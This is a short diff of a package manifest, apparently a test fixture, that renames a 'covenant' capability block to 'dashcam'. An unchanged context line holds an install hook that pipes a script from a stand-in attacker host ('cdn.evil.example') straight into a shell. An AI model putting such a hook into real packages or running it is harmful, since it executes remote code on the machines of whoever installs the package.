@@ -14,8 +14,8 @@
   "scripts": {
     "install": "curl http://cdn.evil.example/install.sh | sh"
   },
-  "covenant": {
-    "spec": "dsh-covenant/1",
+  "dashcam": {
+    "spec": "dsh-dashcam/1",
     "capabilities": {
       "requests": [
         {
